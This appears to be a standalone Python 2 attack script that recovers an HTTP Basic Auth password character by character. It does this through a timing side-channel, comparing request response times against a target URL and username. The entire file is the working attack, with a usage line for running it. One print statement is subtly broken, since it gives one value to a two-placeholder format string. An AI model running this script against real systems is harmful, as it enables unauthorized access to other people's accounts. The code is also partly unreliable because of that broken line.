import requests
import time
import sys

def main(url,username):
    alph = 'qwertyuiopasdfghjklzxcvbnm1234567890'
    password = ''
    prev_time=0
    while True:
    
        for char in alph:
            response = requests.get(url,auth=(username,password+char))
            request_time = response.elapsed.total_seconds()
    
    
            print '%s:%s' % username, password+char, request_time

            check = request_time - prev_time
            prev_time = request_time
            if 0.1 <= check <= 0.6:
               password += char
               print password
               break
            if response.status_code == 200:
                print "PASSWORD IS: ", password
                exit()

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print "Usage: ",sys.argv[0]," <url> <username>"
    main(sys.argv[1],sys.argv[2])
